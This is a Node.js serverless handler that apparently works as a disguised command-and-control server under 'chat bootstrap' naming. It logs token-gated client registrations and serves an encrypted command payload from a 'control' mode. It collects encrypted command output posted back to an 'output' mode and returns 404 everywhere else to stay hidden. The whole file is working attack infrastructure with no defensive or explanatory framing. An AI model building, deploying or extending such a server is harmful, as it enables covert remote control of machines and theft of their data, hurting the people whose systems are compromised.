import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '25';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
